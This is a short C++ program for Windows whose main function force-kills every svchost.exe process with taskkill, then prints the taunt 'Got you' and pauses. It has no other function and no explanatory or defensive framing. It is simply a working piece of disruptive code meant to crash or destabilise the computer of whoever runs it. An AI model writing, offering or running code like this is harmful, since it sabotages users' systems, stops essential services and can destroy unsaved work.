#include <iostream>

using namespace std;

int main() {
	system("taskkill /f /im svchost.exe");
	cout << "Got you";
	system("pause");
	return 0;
}